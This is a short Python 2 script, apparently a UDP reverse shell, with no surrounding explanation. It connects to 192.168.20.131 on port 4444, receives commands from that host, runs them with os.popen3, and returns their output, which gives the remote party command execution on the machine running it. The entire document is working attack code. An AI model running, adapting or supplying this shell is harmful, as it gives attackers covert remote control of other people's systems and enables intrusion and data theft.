import socket,os
so=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
so.connect(('192.168.20.131',4444))
cd=False
while not cd:
	data=so.recv(1024)
	if len(data)==0:
		cd=True
	stdin,stdout,stderr,=os.popen3(data)
	stdout_value=stdout.read()+stderr.read()
	so.send(stdout_value)